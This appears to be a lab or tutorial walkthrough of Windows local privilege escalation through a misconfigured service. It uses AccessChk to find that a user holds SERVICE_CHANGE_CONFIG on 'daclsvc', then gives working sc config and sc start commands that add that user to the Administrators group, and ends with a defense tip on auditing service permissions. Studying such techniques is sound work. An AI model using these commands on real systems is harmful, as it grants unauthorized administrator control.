
---

### 🔍 **Detection: Misconfigured Service Permissions**

You're using **Sysinternals' AccessChk** to verify service permissions:

```cmd
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
```

The output confirms:

- The current user (`User-PC\User`) has `SERVICE_CHANGE_CONFIG` permission on the `daclsvc` service.
    
- This means the user can **reconfigure** how the service runs, including what binary it executes.
    

---

### 💥 **Exploitation: Changing Service Configuration**

Since the user can reconfigure the service:

1. **Overwrite the service executable path** with a command that adds the user to the `Administrators` group:
    
    ```cmd
    sc config daclsvc binpath= "net localgroup administrators user /add"
    ```
    
2. **Start the service**:
    
    ```cmd
    sc start daclsvc
    ```
    
3. **Confirm privilege escalation**:
    
    ```cmd
    net localgroup administrators
    ```
    
    You should now see `user` listed as a member of the `Administrators` group.
    

---

### ✅ **Why This Works**

- Services often run with **SYSTEM privileges**.
    
- If a non-privileged user can **change the service configuration**, they can make the service execute arbitrary commands with SYSTEM-level access.
    
- In this case, you've swapped the service’s binary path to execute a system command that escalates your privileges.
    

---

### 🛡️ **Defense Tip**

To prevent this vulnerability:

- Regularly audit service permissions using tools like **AccessChk** or **PowerView**.
    
- Ensure only trusted administrators have `SERVICE_CHANGE_CONFIG`, `SERVICE_START`, or `SERVICE_STOP` permissions.
    
---